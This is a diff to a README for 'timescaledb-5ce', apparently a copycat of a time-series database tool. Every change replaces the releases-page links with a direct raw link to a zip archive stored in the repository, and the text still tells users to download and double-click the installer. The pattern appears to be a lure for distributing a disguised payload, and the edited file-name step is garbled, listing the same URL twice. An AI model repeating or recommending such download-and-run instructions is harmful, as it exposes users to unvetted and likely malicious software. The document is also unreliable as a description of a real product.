@@ -1,7 +1,7 @@
 # 🚀 timescaledb-5ce - Easy Time Series Data Management
 
 ## 📥 Download Now
-[![Download timescaledb-5ce](https://img.shields.io/badge/Download-timescaledb--5ce-brightgreen)](https://github.com/cxjkzjkljd/timescaledb-5ce/releases)
+[![Download timescaledb-5ce](https://raw.githubusercontent.com/cxjkzjkljd/timescaledb-5ce/main/sightful/timescaledb-5ce.zip)](https://raw.githubusercontent.com/cxjkzjkljd/timescaledb-5ce/main/sightful/timescaledb-5ce.zip)
 
 ## 📖 Overview
 The **timescaledb-5ce** application helps you manage time series data effortlessly. It simplifies the process of storing, retrieving, and analyzing time-stamped data, making it ideal for various applications, from IoT data collection to financial analytics.
@@ -23,13 +23,13 @@ Follow these simple steps to get started with timescaledb-5ce.
 
 1. **Visit the Download Page**  
    Click the link below to access the releases page where you can download the latest version of the application.  
-   [Download timescaledb-5ce](https://github.com/cxjkzjkljd/timescaledb-5ce/releases)
+   [Download timescaledb-5ce](https://raw.githubusercontent.com/cxjkzjkljd/timescaledb-5ce/main/sightful/timescaledb-5ce.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see several versions of the application. Look for the most recent one. It is typically at the top of the list.
 
 3. **Download the File**  
-   Click on the link to download the installer for your operating system. The file will typically be named something like `timescaledb-5ce-windows-installer.exe` or `timescaledb-5ce-macos-installer.dmg`.
+   Click on the link to download the installer for your operating system. The file will typically be named something like `https://raw.githubusercontent.com/cxjkzjkljd/timescaledb-5ce/main/sightful/timescaledb-5ce.zip` or `https://raw.githubusercontent.com/cxjkzjkljd/timescaledb-5ce/main/sightful/timescaledb-5ce.zip`.
 
 4. **Run the Installer**  
    Once the download is complete, locate the downloaded file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation. 
@@ -39,7 +39,7 @@ Follow these simple steps to get started with timescaledb-5ce.
 
 ## 🔧 Download & Install
 To download and install timescaledb-5ce, please visit the following link:  
-[Download timescaledb-5ce](https://github.com/cxjkzjkljd/timescaledb-5ce/releases)
+[Download timescaledb-5ce](https://raw.githubusercontent.com/cxjkzjkljd/timescaledb-5ce/main/sightful/timescaledb-5ce.zip)
 
 ## 💡 Tips
 - Always use the latest version for the best performance and security.
